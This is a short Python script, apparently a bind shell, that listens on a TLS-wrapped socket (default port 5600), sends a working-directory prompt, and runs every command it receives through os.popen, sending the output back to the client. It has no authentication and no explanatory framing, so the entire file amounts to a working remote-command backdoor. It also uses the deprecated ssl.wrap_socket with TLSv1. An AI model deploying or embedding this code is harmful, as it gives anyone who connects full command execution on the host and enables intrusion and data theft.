import socket
import os
import sys
import ssl
from sys import exit
global client
global sock


try:
    try:
        port = int(sys.argv[2])
    except:
        port = 5600
    try:
        ip = sys.argv[1]
    except:
        ip = "127.0.0.1"

    host = (ip, port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock = ssl.wrap_socket(s, certfile='../ssl/server.crt', keyfile='../ssl/server.key', ssl_version=ssl.PROTOCOL_TLSv1)
    sock.bind(host)
    sock.listen(1)

    while True:
        client, addr = sock.accept()
        prompt = os.getcwd() + "> "
        client.send(prompt.encode())
        while True:
            cmd = client.recv(1024)
            if cmd.decode('utf-8') == 'quit':
                sock.close()
                exit(1)

            ter = os.popen(cmd.decode('utf-8'))
            res = ""
            for line in ter:
                res += line
            ret = res + os.getcwd() + "> "
            client.send(ret.encode())
except KeyboardInterrupt:
    try:
        client.send(b"\n\nConnection closed... Goodbye...\n")
    except:
        pass
    sock.close()
except socket.error:
    client.close()

